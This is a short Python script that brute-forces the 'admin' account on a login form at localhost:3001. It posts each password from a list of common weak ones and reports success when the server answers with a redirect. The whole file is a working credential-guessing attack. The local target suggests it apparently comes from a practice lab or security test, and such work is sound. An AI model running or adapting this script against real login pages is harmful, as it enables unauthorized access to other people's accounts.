import requests

url = "http://localhost:3001/login"
username = "admin"

passwords = [
    "password", "123456", "admin123", "letmein",
    "welcome", "monkey", "dragon", "master", "sunshine",
    "princess", "qwerty", "admin", "test", "1234568"
]

print(f"Brute forcing username: {username}")
print(f"Testing {len(passwords)} passwords..\n")

for password in passwords:
    response = requests.post(
        url,
        data={"username": username, "password": password},
        allow_redirects=False
    )

    if response.status_code == 302:
        print(f"SUCCESS! Password found: {password}")
        print(f"Login at: {url}")
        break
    else:
        print(f"Failed: {password}")

else:
    print("\nNo password found in the list.")
